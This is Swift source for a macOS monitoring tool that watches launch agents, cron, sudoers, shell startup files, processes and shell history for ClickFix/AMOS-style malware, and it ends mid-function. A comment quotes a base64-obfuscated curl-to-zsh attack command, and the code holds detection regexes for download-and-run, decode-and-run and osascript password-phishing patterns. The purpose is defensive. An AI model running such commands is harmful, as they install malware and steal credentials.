import AppKit
import CryptoKit
import Darwin
import Security
import UserNotifications

// 安全页：盯住恶意脚本最常用的几条路。
//
// 起因：2026-11 发现本机被 ClickFix 类木马（AMOS 一系）潜伏了 8 个月——在终端粘贴了
// `curl -sfkSL $(echo '<base64>'|base64 -D) | zsh`，随后它装了两个 root 的 LaunchDaemon：
// 一个跑主目录里的隐藏文件（~/.agent → ~/.mainhelper），一个起名 com.apple.metadata.mds.worker 冒充系统服务。
// 下面每条规则都对着这套手法：
//   启动项  LaunchAgents / LaunchDaemons 三个目录实时监听，另查 cron、sudoers.d、配置描述文件、shell 启动文件
//   进程    每 3 秒看一遍：root 跑用户目录里的程序、藏在隐藏文件/临时目录的后台程序、骗密码的 osascript 弹窗、
//           curl/wget 下载的内容被直接管道给 shell
//   终端    命令历史一变就查：base64 解码后执行、curl -k 管道给 shell、不认识的网站的安装脚本
//   系统    SIP、Gatekeeper、FileVault、防火墙
// 首次运行把现有的非高危项记作「已知」，之后新出现的才提醒；高危项不进基线，一定会报。

enum Severity: Int, Codable, Comparable {
    case info, warning, critical
    static func < (a: Severity, b: Severity) -> Bool { a.rawValue < b.rawValue }
}

struct SecurityAlert: Identifiable, Codable, Equatable {
    enum Kind: String, Codable { case launchItem, process, command, config, system }

    var id: String // stable key, also what 信任 / 知道了 remember
    var kind: Kind
    var severity: Severity
    var title: String
    var detail: String
    var path: String?       // plist / config file
    var executable: String? // what it runs
    var pid: Int32?
    var uid: UInt32?
    var label: String?      // launchd label
    var system = false      // root domain (needs admin to act on)
    var date = Date()
    var event = false       // one-off (a command, a pipe): stays until 知道了
}

/// One launchd job, for the 启动项 list.
struct LaunchItemInfo: Identifiable, Equatable {
    var id: String { plist }
    let plist: String
    let label: String
    let scope: String // 用户 / 全局 / 系统守护
    let target: String?
    let signer: Signer
    let severity: Severity?
}

enum Signer: Equatable {
    case apple, developer(String), adhoc, unsigned, script, missing

    var text: String {
        switch self {
        case .apple: return "Apple"
        case .developer(let name): return name
        case .adhoc: return "未签名（ad-hoc）"
        case .unsigned: return "未签名"
        case .script: return "脚本"
        case .missing: return "程序不存在"
        }
    }

    var trusted: Bool {
        switch self {
        case .apple, .developer: return true
        default: return false
        }
    }
}

struct Posture: Equatable {
    var sip: Bool?
    var gatekeeper: Bool?
    var fileVault: Bool?
    var firewall: Bool?
}

@MainActor
final class SecurityGuard: NSObject, ObservableObject {
    @Published private(set) var alerts: [SecurityAlert] = []
    @Published private(set) var launchItems: [LaunchItemInfo] = []
    @Published private(set) var posture = Posture()
    @Published private(set) var lastScan: Date?
    @Published private(set) var processCount = 0
    @Published private(set) var historyInstant = SecurityGuard.zshWritesHistoryInstantly()

    /// Menu bar shield: something unresolved at warning level or above.
    var needsAttention: Bool { alerts.contains { $0.severity >= .warning } }
    var onOpenRequest: (() -> Void)?

    private let scanner = GuardScanner()
    private let queue = DispatchQueue(label: "yilan.guard", qos: .utility)
    private var findings: [SecurityAlert] = []      // current state from the last scans
    private var processFindings: [SecurityAlert] = []
    private var events: [SecurityAlert] = SecurityGuard.loadEvents()
    private var trusted = Set(UserDefaults.standard.stringArray(forKey: "guardTrusted") ?? [])
    private var dismissed = Set(UserDefaults.standard.stringArray(forKey: "guardDismissed") ?? [])
    private var notified = Set(UserDefaults.standard.stringArray(forKey: "guardNotified") ?? [])
    private var baselined = UserDefaults.standard.bool(forKey: "guardBaselined")
    private var watchers: [DispatchSourceFileSystemObject] = []
    private var processTimer: Timer?
    private var slowTimer: Timer?
    private var pendingScan: DispatchWorkItem?
    private var historyStamp: [String: Date] = [:]
    private var processScanRunning = false
    private var pageVisible = false

    static let quarantineRoot = FileManager.default.homeDirectoryForCurrentUser
        .appendingPathComponent("Library/Application Support/一览/隔离区")

    override init() {
        super.init()
        UNUserNotificationCenter.current().delegate = self
        UNUserNotificationCenter.current().requestAuthorization(options: [.alert, .sound]) { _, _ in }
        watchDirectories()
        scanAll()
        processTimer = Timer.scheduledTimer(withTimeInterval: 3, repeats: true) { [weak self] _ in
            MainActor.assumeIsolated { self?.scanProcesses() }
        }
        processTimer?.tolerance = 0.5
        // Fallback for anything the directory watchers can't see (cron, profiles, sudoers, history).
        slowTimer = Timer.scheduledTimer(withTimeInterval: 60, repeats: true) { [weak self] _ in
            MainActor.assumeIsolated { self?.scanSlow() }
        }
        slowTimer?.tolerance = 10
    }

    func setVisible(_ visible: Bool) {
        pageVisible = visible
        guard visible else { return }
        historyInstant = Self.zshWritesHistoryInstantly()
        scanAll()
        refreshPosture()
    }

    // MARK: Scanning

    func scanAll() {
        scanPersistence()
        scanProcesses()
        scanHistory(force: true)
    }

    private func scanSlow() {
        scanPersistence()
        scanHistory(force: false)
    }

    private func scanPersistence() {
        let scanner = scanner
        queue.async {
            let result = scanner.scanPersistence()
            DispatchQueue.main.async { MainActor.assumeIsolated { self.applyPersistence(result) } }
        }
    }

    private func applyPersistence(_ result: (alerts: [SecurityAlert], items: [LaunchItemInfo])) {
        if !baselined {
            // Whatever is already here and not outright malicious is taken as known.
            for alert in result.alerts where alert.severity < .critical { trusted.insert(alert.id) }
            baselined = true
            UserDefaults.standard.set(true, forKey: "guardBaselined")
            saveTrusted()
        }
        findings = result.alerts
        launchItems = result.items
        lastScan = Date()
        publish()
    }

    private func scanProcesses() {
        guard !processScanRunning else { return }
        processScanRunning = true
        let scanner = scanner
        let firstRun = !UserDefaults.standard.bool(forKey: "guardProcessBaselined")
        queue.async {
            let result = scanner.scanProcesses()
            DispatchQueue.main.async {
                MainActor.assumeIsolated {
                    self.processScanRunning = false
                    if firstRun {
                        for alert in result.alerts where alert.severity < .critical && !alert.event { self.trusted.insert(alert.id) }
                        UserDefaults.standard.set(true, forKey: "guardProcessBaselined")
                        self.saveTrusted()
                    }
                    if self.pageVisible, self.processCount != result.count { self.processCount = result.count }
                    self.processFindings = result.alerts.filter { !$0.event }
                    self.addEvents(result.alerts.filter(\.event))
                    self.publish()
                }
            }
        }
    }

    private func scanHistory(force: Bool) {
        let files = GuardScanner.historyFiles
        var changed: [String] = []
        for file in files {
            let date = (try? FileManager.default.attributesOfItem(atPath: file)[.modificationDate]) as? Date
            if force || date != historyStamp[file] { changed.append(file) }
            historyStamp[file] = date
        }
        guard !changed.isEmpty else { return }
        queue.async {
            let found = changed.flatMap(GuardScanner.scanHistory(file:))
            DispatchQueue.main.async { MainActor.assumeIsolated { self.addEvents(found); self.publish() } }
        }
    }

    private func addEvents(_ new: [SecurityAlert]) {
        var added = false
        for alert in new where !dismissed.contains(alert.id) && !trusted.contains(alert.id) {
            if !events.contains(where: { $0.id == alert.id }) {
                events.insert(alert, at: 0)
                added = true
            }
        }
        if added {
            events = Array(events.prefix(60))
            saveEvents()
        }
    }

    private func publish() {
        let current = (findings + processFindings).filter { !trusted.contains($0.id) }
        var seen = Set<String>()
        let all = (current + events).filter { seen.insert($0.id).inserted }.sorted { ($0.severity, $0.date) > ($1.severity, $1.date) }
        if all != alerts { alerts = all }
        notifyNew()
    }

    // MARK: Watching

    private func watchDirectories() {
        let home = FileManager.default.homeDirectoryForCurrentUser.path
        var dirs = GuardScanner.launchDirectories.map(\.path)
        dirs.append(home) // history files are rewritten in place or renamed over
        dirs.append("/etc/sudoers.d")
        for dir in dirs {
            let fd = open(dir, O_EVTONLY)
            guard fd >= 0 else { continue }
            let source = DispatchSource.makeFileSystemObjectSource(fileDescriptor: fd, eventMask: [.write, .rename, .delete],
                                                                   queue: .main)
            let isHome = dir == home
            source.setEventHandler { [weak self] in
                MainActor.assumeIsolated {
                    if isHome { self?.scanHistory(force: false) } else { self?.debouncedPersistenceScan() }
                }
            }
            source.setCancelHandler { close(fd) }
            source.resume()
            watchers.append(source)
        }
        // zsh with INC_APPEND_HISTORY appends to the file itself without touching the directory.
        for file in GuardScanner.historyFiles {
            let fd = open(file, O_EVTONLY)
            guard fd >= 0 else { continue }
            let source = DispatchSource.makeFileSystemObjectSource(fileDescriptor: fd, eventMask: [.write, .extend], queue: .main)
            source.setEventHandler { [weak self] in MainActor.assumeIsolated { self?.scanHistory(force: false) } }
            source.setCancelHandler { close(fd) }
            source.resume()
            watchers.append(source)
        }
    }

    private func debouncedPersistenceScan() {
        pendingScan?.cancel()
        let work = DispatchWorkItem { [weak self] in MainActor.assumeIsolated { self?.scanPersistence() } }
        pendingScan = work
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.8, execute: work)
    }

    func refreshPosture() {
        queue.async {
            let p = GuardScanner.posture()
            DispatchQueue.main.async {
                MainActor.assumeIsolated {
                    self.posture = p
                    var sys: [SecurityAlert] = []
                    if p.sip == false {
                        sys.append(SecurityAlert(id: "system|sip", kind: .system, severity: .warning, title: "系统完整性保护（SIP）已关闭",
                                                 detail: "恶意程序可以改动系统文件。除非你自己关的，否则在恢复模式运行 csrutil enable 打开。"))
                    }
                    if p.gatekeeper == false {
                        sys.append(SecurityAlert(id: "system|gatekeeper", kind: .system, severity: .warning, title: "Gatekeeper 已关闭",
                                                 detail: "任何来源的程序都能直接运行。终端运行 sudo spctl --master-enable 打开。"))
                    }
                    self.findings.removeAll { $0.kind == .system }
                    self.findings += sys
                    self.publish()
                }
            }
        }
    }

    // MARK: Notifications

    private func notifyNew() {
        let fresh = alerts.filter { $0.severity >= .warning && !notified.contains($0.id) }
        guard !fresh.isEmpty else { return }
        fresh.forEach { notified.insert($0.id) }
        UserDefaults.standard.set(Array(notified.suffix(500)), forKey: "guardNotified")
        let content = UNMutableNotificationContent()
        let top = fresh[0]
        content.title = top.severity == .critical ? "⚠️ 一览发现高危异常" : "一览：发现新的后台项目"
        content.body = fresh.count == 1 ? "\(top.title)\n\(top.detail)" : "\(top.title)，另有 \(fresh.count - 1) 项"
        content.sound = top.severity == .critical ? .defaultCritical : .default
        let request = UNNotificationRequest(identifier: UUID().uuidString, content: content, trigger: nil)
        UNUserNotificationCenter.current().add(request)
    }

    // MARK: Actions

    func trust(_ alert: SecurityAlert) {
        if alert.severity == .critical {
            let confirm = NSAlert()
            confirm.messageText = "确定信任这一项？"
            confirm.informativeText = "它被判为高危：\(alert.detail)\n\n信任后不再提醒（内容一改动会重新提醒）。"
            confirm.addButton(withTitle: "信任")
            confirm.addButton(withTitle: "取消")
            NSApp.activate()
            guard confirm.runModal() == .alertFirstButtonReturn else { return }
        }
        trusted.insert(alert.id)
        saveTrusted()
        events.removeAll { $0.id == alert.id }
        saveEvents()
        publish()
    }

    func dismiss(_ alert: SecurityAlert) {
        dismissed.insert(alert.id)
        UserDefaults.standard.set(Array(dismissed.suffix(1000)), forKey: "guardDismissed")
        events.removeAll { $0.id == alert.id }
        saveEvents()
        publish()
    }

    func dismissAllEvents() {
        events.forEach { dismissed.insert($0.id) }
        UserDefaults.standard.set(Array(dismissed.suffix(1000)), forKey: "guardDismissed")
        events = []
        saveEvents()
        publish()
    }

    func reveal(_ path: String) {
        let url = URL(fileURLWithPath: path)
        if FileManager.default.fileExists(atPath: path) {
            NSWorkspace.shared.activateFileViewerSelecting([url])
        } else {
            NSWorkspace.shared.activateFileViewerSelecting([url.deletingLastPathComponent()])
        }
    }

    /// Ends a process; root processes go through an administrator prompt.
    func kill(_ alert: SecurityAlert) {
        guard let pid = alert.pid else { return }
        if alert.uid == 0 || Darwin.kill(pid, SIGKILL) != 0 {
            _ = Self.runAsAdmin("kill -9 \(pid)", prompt: "一览需要管理员权限来结束可疑进程（PID \(pid)）。")
        }
        events.removeAll { $0.id == alert.id && $0.pid == pid }
        saveEvents()
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) { self.scanProcesses() }
    }

    /// Unloads a launchd job and moves its plist — and, for flagged items, the program it runs — into the
    /// quarantine folder with a note of where they came from, so nothing is deleted outright.
    func disable(_ alert: SecurityAlert) {
        guard let plist = alert.path else { return }
        let confirm = NSAlert()
        confirm.messageText = "停用并隔离「\(alert.label ?? (plist as NSString).lastPathComponent)」？"
        var moving = [plist]
        if alert.severity == .critical, let exe = alert.executable, GuardScanner.isMovable(exe) { moving.append(exe) }
        confirm.informativeText = "会立即停止它，并把下面的文件移到「一览/隔离区」（不删除，可以放回）：\n\n"
            + moving.joined(separator: "\n") + (alert.system ? "\n\n系统级项目需要输入管理员密码。" : "")
        confirm.addButton(withTitle: "停用并隔离")
        confirm.addButton(withTitle: "取消")
        NSApp.activate()
        guard confirm.runModal() == .alertFirstButtonReturn else { return }

        let stamp = ISO8601DateFormatter().string(from: Date()).replacingOccurrences(of: ":", with: "")
        let dest = Self.quarantineRoot.appendingPathComponent(stamp)
        try? FileManager.default.createDirectory(at: dest, withIntermediateDirectories: true)
        let note = "一览隔离于 \(Date())\n原因：\(alert.title)——\(alert.detail)\n\n原位置：\n" + moving.joined(separator: "\n")
            + "\n\n放回：把文件移回原位置，再运行 launchctl bootstrap \(alert.system ? "system" : "gui/\(getuid())") <plist 原路径>\n"
        try? note.write(to: dest.appendingPathComponent("来源.txt"), atomically: true, encoding: .utf8)

        let quoted = { (s: String) in "'" + s.replacingOccurrences(of: "'", with: "'\\''") + "'" }
        let domain = alert.system ? "system" : "gui/\(getuid())"
        var script = "launchctl bootout \(domain) \(quoted(plist)) 2>/dev/null; "
        if let label = alert.label { script += "launchctl bootout \(domain)/\(quoted(label)) 2>/dev/null; " }
        script += moving.map { "mv -f \(quoted($0)) \(quoted(dest.path))/" }.joined(separator: " && ")
        if alert.system {
            script += " && chown -R \(getuid()) \(quoted(dest.path))"
            if !Self.runAsAdmin(script, prompt: "一览需要管理员权限来停用系统启动项。") { return }
        } else {
            let task = Process()
            task.executableURL = URL(fileURLWithPath: "/bin/sh")
            task.arguments = ["-c", script]
            try? task.run()
            task.waitUntilExit()
        }
        NSWorkspace.shared.activateFileViewerSelecting([dest])
        scanPersistence()
        DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) { self.scanProcesses() }
    }

    /// Makes zsh write each command to the history file as it runs, so a pasted command is checked within
    /// seconds instead of when the terminal window closes.
    func enableInstantHistory() {
        let rc = FileManager.default.homeDirectoryForCurrentUser.appendingPathComponent(".zshrc")
        let line = "\n# 一览安全页：命令一执行就写入历史，便于即时检查\nsetopt INC_APPEND_HISTORY\n"
        if let handle = try? FileHandle(forWritingTo: rc) {
            handle.seekToEndOfFile()
            handle.write(Data(line.utf8))
            try? handle.close()
        } else {
            try? line.write(to: rc, atomically: true, encoding: .utf8)
        }
        historyInstant = Self.zshWritesHistoryInstantly()
    }

    static func zshWritesHistoryInstantly() -> Bool {
        let home = FileManager.default.homeDirectoryForCurrentUser.path
        let text = ["/.zshrc", "/.zprofile", "/.zshenv"].compactMap { try? String(contentsOfFile: home + $0, encoding: .utf8) }
            .joined(separator: "\n").lowercased()
        return ["inc_append_history", "share_history", "incappendhistory", "sharehistory"].contains { option in
            text.split(separator: "\n").contains { !$0.trimmingCharacters(in: .whitespaces).hasPrefix("#") && $0.contains(option) && $0.contains("setopt") }
        }
    }

    // MARK: Persistence of state

    private func saveTrusted() { UserDefaults.standard.set(Array(trusted), forKey: "guardTrusted") }

    private func saveEvents() {
        UserDefaults.standard.set(try? JSONEncoder().encode(events), forKey: "guardEvents")
    }

    private static func loadEvents() -> [SecurityAlert] {
        guard let data = UserDefaults.standard.data(forKey: "guardEvents") else { return [] }
        return (try? JSONDecoder().decode([SecurityAlert].self, from: data)) ?? []
    }

    static func runAsAdmin(_ shell: String, prompt: String) -> Bool {
        let escaped = shell.replacingOccurrences(of: "\\", with: "\\\\").replacingOccurrences(of: "\"", with: "\\\"")
        let source = "do shell script \"\(escaped)\" with administrator privileges with prompt \"\(prompt)\""
        var error: NSDictionary?
        NSAppleScript(source: source)?.executeAndReturnError(&error)
        if let error { NSLog("VolumeMixer: guard admin script failed: \(error)") }
        return error == nil
    }
}

extension SecurityGuard: UNUserNotificationCenterDelegate {
    nonisolated func userNotificationCenter(_ center: UNUserNotificationCenter, willPresent notification: UNNotification,
                                            withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -> Void) {
        completionHandler([.banner, .sound, .list])
    }

    nonisolated func userNotificationCenter(_ center: UNUserNotificationCenter, didReceive response: UNNotificationResponse,
                                            withCompletionHandler completionHandler: @escaping () -> Void) {
        DispatchQueue.main.async { MainActor.assumeIsolated { self.onOpenRequest?() } }
        completionHandler()
    }
}

// MARK: - Scanner (runs on the guard queue)

final class GuardScanner: @unchecked Sendable {
    static let home = FileManager.default.homeDirectoryForCurrentUser.path

    static let launchDirectories: [(path: String, scope: String, system: Bool)] = [
        (home + "/Library/LaunchAgents", "用户", false),
        ("/Library/LaunchAgents", "全局", false),
        ("/Library/LaunchDaemons", "系统守护", true),
    ]

    static let historyFiles = [home + "/.zsh_history", home + "/.bash_history", home + "/.sh_history"]
        .filter { FileManager.default.fileExists(atPath: $0) }

    static let shellConfigFiles = ["/.zshrc", "/.zprofile", "/.zshenv", "/.zlogin", "/.bash_profile", "/.bashrc", "/.profile"]
        .map { home + $0 }

    static let interpreters: Set<String> = ["sh", "bash", "zsh", "dash", "ksh", "csh", "tcsh", "fish", "perl", "ruby",
                                            "node", "osascript", "bun", "deno", "php", "python", "python2", "python3"]

    /// Hosts whose `curl … | sh` installers are routine; anything else piped into a shell gets flagged.
    static let knownInstallHosts = ["claude.ai", "anthropic.com", "brew.sh", "raw.githubusercontent.com/Homebrew/",
                                    "sh.rustup.rs", "rustup.rs", "bun.sh", "deno.land", "astral.sh", "get.pnpm.io",
                                    "ollama.com", "nodejs.org", "nvm-sh/nvm", "github.com/nvm-sh", "opencode.ai",
                                    "install.python-poetry.org", "get.docker.com", "cursor.com", "x.ai", "openai.com",
                                    "volta.sh", "starship.rs", "ohmyz.sh", "ohmyzsh/ohmyzsh"]

    private var signatures: [String: (stamp: Date?, signer: Signer)] = [:]
    /// Verdicts for processes already looked at, keyed by pid and checked against ppid/uid so a reused pid is re-examined.
    private var seen: [pid_t: (ppid: pid_t, uid: uid_t, proc: Proc, alert: SecurityAlert?)] = [:]

    // MARK: Persistence

    func scanPersistence() -> (alerts: [SecurityAlert], items: [LaunchItemInfo]) {
        var alerts: [SecurityAlert] = []
        var items: [LaunchItemInfo] = []
        let fm = FileManager.default

        for dir in Self.launchDirectories {
            let names = (try? fm.contentsOfDirectory(atPath: dir.path)) ?? []
            for name in names.sorted() where name.hasSuffix(".plist") {
                let plist = dir.path + "/" + name
                guard let data = fm.contents(atPath: plist) else { continue }
                let dict = (try? PropertyListSerialization.propertyList(from: data, format: nil)) as? [String: Any] ?? [:]
                let label = dict["Label"] as? String ?? (name as NSString).deletingPathExtension
                let args = (dict["ProgramArguments"] as? [String]) ?? []
                let program = (dict["Program"] as? String) ?? args.first
                let workdir = dict["WorkingDirectory"] as? String
                let (target, inline) = Self.resolveTarget(program: program, args: args, workdir: workdir)
                let signer = target.map(signer(for:)) ?? .missing

                var reasons: [String] = []
                var severity: Severity?
                func flag(_ s: Severity, _ why: String) {
                    reasons.append(why)
                    severity = max(severity ?? s, s)
                }
                if label.hasPrefix("com.apple.") || name.hasPrefix("com.apple.") {
                    flag(.critical, "名字冒充苹果系统服务（真正的苹果服务只在 /System 里）")
                }
                if dir.system, let t = target, t.hasPrefix("/Users/") {
                    flag(.critical, "以 root 身份运行用户目录里的程序")
                }
                if let t = target, let place = Self.riskyPlace(t) {
                    flag(.critical, "程序\(place)")
                }
                if let inline, Self.commandRisk(inline) != nil {
                    flag(.critical, "启动时直接执行下载或解码出来的命令")
                }
                if dir.system, signer == .unsigned || signer == .adhoc {
                    flag(.warning, "系统守护进程跑的是未签名程序")
                }
                if signer == .missing, program != nil {
                    flag(.info, "指向的程序已不存在")
                }

                let key = "launch|\(plist)|\(Self.digest(data))"
                items.append(LaunchItemInfo(plist: plist, label: label, scope: dir.scope, target: target ?? inline,
                                            signer: signer, severity: severity))
                let isNewOnly = severity == nil || severity == .info
                let detail = (reasons.isEmpty ? [] : [reasons.joined(separator: "；")])
                    + ["签名：\(signer.text)", "运行：\(target ?? inline ?? "—")"]
                alerts.append(SecurityAlert(id: key, kind: .launchItem,
                                            severity: isNewOnly ? .warning : severity!,
                                            title: isNewOnly ? "新增启动项 \(label)" : "可疑启动项 \(label)",
                                            detail: detail.joined(separator: "\n"),
                                            path: plist, executable: target, label: label, system: dir.system))
            }
        }

        // sudo rules: a NOPASSWD line dropped here gives root to anything.
        for name in (try? fm.contentsOfDirectory(atPath: "/etc/sudoers.d")) ?? [] {
            let path = "/etc/sudoers.d/" + name
            let stamp = (try? fm.attributesOfItem(atPath: path)[.modificationDate] as? Date).map { "\($0.timeIntervalSince1970)" } ?? ""
            // Usually root-only readable; when it can be read, a blanket NOPASSWD is outright dangerous.
            let text = (try? String(contentsOfFile: path, encoding: .utf8)) ?? ""
            let blanket = text.range(of: #"NOPASSWD:\s*ALL"#, options: .regularExpression) != nil
            alerts.append(SecurityAlert(id: "sudoers|\(path)|\(stamp)", kind: .config, severity: blanket ? .critical : .warning,
                                        title: "新增 sudo 规则 \(name)",
                                        detail: "/etc/sudoers.d 里多了规则文件，可能让某个程序免密码拿到 root。不是你装的就要删除。",
                                        path: path))
        }

        // cron
        let crontab = Self.run("/usr/bin/crontab", ["-l"])
        for line in crontab.hasPrefix("crontab:") ? [] : crontab.split(separator: "\n") {
            let entry = line.trimmingCharacters(in: .whitespaces)
            guard !entry.isEmpty, !entry.hasPrefix("#"), !entry.contains("=") || entry.contains(" ") else { continue }
            let risky = Self.commandRisk(entry) != nil
            alerts.append(SecurityAlert(id: "cron|\(Self.digest(Data(entry.utf8)))", kind: .config,
                                        severity: risky ? .critical : .warning,
                                        title: risky ? "可疑的定时任务（cron）" : "新增定时任务（cron）",
                                        detail: String(entry.prefix(300)) + "\n终端运行 crontab -e 可编辑。"))
        }

        // Configuration profiles can install root certificates, proxies and managed settings.
        let profiles = Self.run("/usr/bin/profiles", ["list"])
        for line in profiles.split(separator: "\n") {
            guard let range = line.range(of: "profileIdentifier: ") else { continue }
            let id = String(line[range.upperBound...]).trimmingCharacters(in: .whitespaces)
            alerts.append(SecurityAlert(id: "profile|\(id)", kind: .config, severity: .warning,
                                        title: "新增配置描述文件",
                                        detail: "\(id)\n描述文件能装根证书、改代理。到「系统设置 › 通用 › 设备管理」查看。"))
        }

        // Shell startup files: a curl|sh or decoded payload here runs in every new terminal.
        for file in Self.shellConfigFiles {
            guard let text = try? String(contentsOfFile: file, encoding: .utf8) else { continue }
            for line in text.split(separator: "\n") {
                let l = line.trimmingCharacters(in: .whitespaces)
                guard !l.hasPrefix("#"), let risk = Self.commandRisk(l), risk.severity == .critical else { continue }
                alerts.append(SecurityAlert(id: "rc|\(file)|\(Self.digest(Data(l.utf8)))", kind: .config, severity: .critical,
                                            title: "终端启动文件里有可疑命令",
                                            detail: "\(risk.reason)\n\(String(l.prefix(300)))", path: file))
            }
        }

        let order: [String: Int] = ["系统守护": 0, "全局": 1, "用户": 2]
        items.sort { ((order[$0.scope] ?? 3), $0.label) < ((order[$1.scope] ?? 3), $1.label) }
        return (alerts, items)
    }

    /// The file a job really runs: for `zsh script.sh` / `python x.py` that's the script, for `sh -c "…"` the inline text.
    static func resolveTarget(program: String?, args: [String], workdir: String?) -> (path: String?, inline: String?) {
        guard let program else { return (nil, nil) }
        let base = (program as NSString).lastPathComponent
        let isInterpreter = interpreters.contains(base) || base.hasPrefix("python")
        guard isInterpreter else { return (program, nil) }
        let rest = args.first == program || (args.first.map { ($0 as NSString).lastPathComponent } == base) ? Array(args.dropFirst()) : args
        if let c = rest.firstIndex(where: { $0 == "-c" || $0 == "-e" }), c + 1 < rest.count {
            return (program, rest[c + 1])
        }
        if let script = rest.first(where: { !$0.hasPrefix("-") }) {
            if script.hasPrefix("/") { return (script, nil) }
            if let workdir { return ((workdir as NSString).appendingPathComponent(script), nil) }
            return (script, nil)
        }
        return (program, nil)
    }

    /// Where malware likes to hide: temp folders, the shared folder, dot-files right in the home folder.
    static func riskyPlace(_ path: String) -> String? {
        if path.hasPrefix("/tmp/") || path.hasPrefix("/private/tmp/") { return "放在临时目录里" }
        if path.hasPrefix("/Users/Shared/") { return "放在共享目录里" }
        if path.hasPrefix("/private/var/folders/") || path.hasPrefix("/var/folders/") { return "放在系统临时目录里" }
        if path.hasPrefix(home + "/.") {
            let rest = path.dropFirst(home.count + 1)
            if !rest.contains("/") { return "是主目录里的隐藏文件" }
        }
        return nil
    }

    static func isMovable(_ path: String) -> Bool {
        !path.hasPrefix("/System/") && !path.hasPrefix("/usr/") && !path.hasPrefix("/bin/") && !path.hasPrefix("/sbin/")
            && !path.hasPrefix("/Applications/") && !path.hasPrefix("/opt/homebrew/Cellar/")
            && FileManager.default.fileExists(atPath: path)
    }

    // MARK: Commands

    /// Is this a download-and-run, a decode-and-run, or a password-phishing dialog?
    static func commandRisk(_ raw: String) -> (severity: Severity, reason: String)? {
        let line = raw.lowercased()
        let pipesToShell = line.range(of: #"\|\s*(sudo\s+)?(/bin/|/usr/bin/)?(ba|z|da|k)?sh\b|\|\s*(sudo\s+)?(python3?|perl|ruby|node|osascript)\b"#,
                                      options: .regularExpression) != nil
            || line.range(of: #"(ba|z)?sh\s+-c\s+["']?\$\((curl|wget)"#, options: .regularExpression) != nil
            || line.range(of: #"eval\s+["']?\$\((curl|wget|echo)"#, options: .regularExpression) != nil
        let downloads = line.contains("curl") || line.contains("wget")
        let decodes = line.range(of: #"base64\s+(-d|-D|--decode)"#, options: [.regularExpression, .caseInsensitive]) != nil
            || raw.contains("base64 -D")

        if line.contains("osascript"), line.contains("hidden answer") {
            return (.critical, "用 osascript 弹窗骗取密码（AMOS 木马的典型手法）")
        }
        if decodes, pipesToShell || downloads || line.contains("eval") {
            return (.critical, "先把一段 base64 解码再执行——正常安装脚本不会这样藏网址")
        }
        guard downloads, pipesToShell else {
            if line.contains("xattr"), line.contains("quarantine") || line.contains(" -c ") || line.hasSuffix(" -c") {
                return (.warning, "去掉了文件的隔离标记，Gatekeeper 将不再检查它")
            }
            return nil
        }
        if line.range(of: #"\s-[a-z]*k[a-z]*\s|--insecure"#, options: .regularExpression) != nil {
            return (.critical, "下载时关闭了证书校验（-k），再直接交给 shell 执行")
        }
        if line.range(of: #"https?://\d{1,3}(\.\d{1,3}){3}"#, options: .regularExpression) != nil {
            return (.critical, "从裸 IP 下载脚本并直接执行")
        }
        if knownInstallHosts.contains(where: { line.contains($0.lowercased()) }) { return nil }
        return (.critical, "从不认识的网站下载脚本并直接交给 shell 执行（ClickFix 骗局的典型做法）")
    }

    /// Readable hint for obfuscated commands: decodes `echo '<base64>'` chunks so the real URL shows.
    static func decodedHint(_ line: String) -> String? {
        guard let regex = try? NSRegularExpression(pattern: #"['"]([A-Za-z0-9+/=]{16,})['"]"#) else { return nil }
        let ns = line as NSString
        for match in regex.matches(in: line, range: NSRange(location: 0, length: ns.length)) {
            let chunk = ns.substring(with: match.range(at: 1))
            if let data = Data(base64Encoded: chunk), let text = String(data: data, encoding: .utf8),
               text.unicodeScalars.allSatisfy({ $0.value >= 0x20 && $0.value < 0x7f }) {
                return text
            }
        }
        return nil
    }

    static func scanHistory(file: String) -> [SecurityAlert] {
        guard let data = FileManager.default.contents(atPath: file) else { return [] }
        let text = String(decoding: data, as: UTF8.self)
        var alerts: [SecurityAlert] = []
        // zsh extended history: ": 1700000000:0;command", multi-line commands end lines with a backslash.
        var command = ""
        var when: Date?
        func finish() {
            defer { command = ""; when = nil }
            let c = command.trimmingCharacters(in: .whitespacesAndNewlines)
            guard !c.isEmpty, let risk = commandRisk(c) else { return }
            // Decoded URL and time first: the raw command is mostly a long base64 blob and gets cut off.
            var detail = risk.reason
            if let decoded = decodedHint(c) { detail += "\n解码后：\(decoded)" }
            if let when { detail += "\n时间：\(when.formatted(date: .abbreviated, time: .shortened))" }
            detail += "\n" + (c.count > 120 ? String(c.prefix(120)) + "…" : c)
            alerts.append(SecurityAlert(id: "cmd|\(digest(Data(c.utf8)))", kind: .command, severity: risk.severity,
                                        title: "终端运行过可疑命令", detail: detail, path: file,
                                        date: when ?? Date(), event: true))
        }
        for raw in text.split(separator: "\n", omittingEmptySubsequences: false) {
            var line = String(raw)
            if command.isEmpty, line.hasPrefix(": "), let semi = line.firstIndex(of: ";") {
                let stamp = line.dropFirst(2).prefix { $0.isNumber }
                when = Double(stamp).map { Date(timeIntervalSince1970: $0) }
                line = String(line[line.index(after: semi)...])
            }
            if line.hasSuffix("\\") {
                command += line.dropLast() + "\n"
            } else {
                command += line
                finish()
            }
        }
        finish()
        return alerts
    }

    // MARK: Processes

    struct Proc {
        let pid: pid_t, ppid: pid_t, pgid: pid_t, uid: uid_t
        let path: String
        var name: String { (path as NSString).lastPathComponent }
    }

    func scanProcesses() -> (alerts: [SecurityAlert], count: Int) {
        var pids = [pid_t](repeating: 0, count: Int(proc_listallpids(nil, 0)) + 64)
        let filled = proc_listallpids(&pids, Int32(pids.count * MemoryLayout<pid_t>.stride))
        guard filled > 0 else { return ([], 0) }
        let me = getuid(), ownPID = getpid()
        var procs: [Proc] = []
        var alerts: [SecurityAlert] = []
        var current: [pid_t: (ppid: pid_t, uid: uid_t, proc: Proc, alert: SecurityAlert?)] = [:]
        var buffer = [CChar](repeating: 0, count: 4096)
        for pid in pids.prefix(Int(filled)) where pid > 0 && pid != ownPID {
            var info = proc_bsdshortinfo()
            guard proc_pidinfo(pid, PROC_PIDT_SHORTBSDINFO, 0, &info, Int32(MemoryLayout<proc_bsdshortinfo>.size)) > 0 else { continue }
            let ppid = pid_t(info.pbsi_ppid), uid = info.pbsi_uid
            if let known = seen[pid], known.ppid == ppid, known.uid == uid {
                current[pid] = known
                procs.append(known.proc)
                if let alert = known.alert { alerts.append(alert) }
                continue
            }
            guard proc_pidpath(pid, &buffer, UInt32(buffer.count)) > 0 else { continue }
